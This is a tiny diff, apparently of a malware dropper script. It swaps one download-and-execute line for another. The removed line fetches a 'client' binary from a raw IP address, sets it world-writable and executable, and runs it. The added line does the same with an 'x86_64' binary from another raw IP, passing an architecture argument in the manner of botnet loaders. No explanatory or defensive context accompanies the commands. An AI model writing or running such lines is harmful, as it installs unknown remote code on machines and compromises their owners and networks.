@@ -1,5 +1,4 @@
-wget http://45.95.55.17/client; chmod 777 client; ./client
-
+wget http://193.233.185.152/x86_64; chmod 777 x86_64; ./x86_64 x86
 
 
 
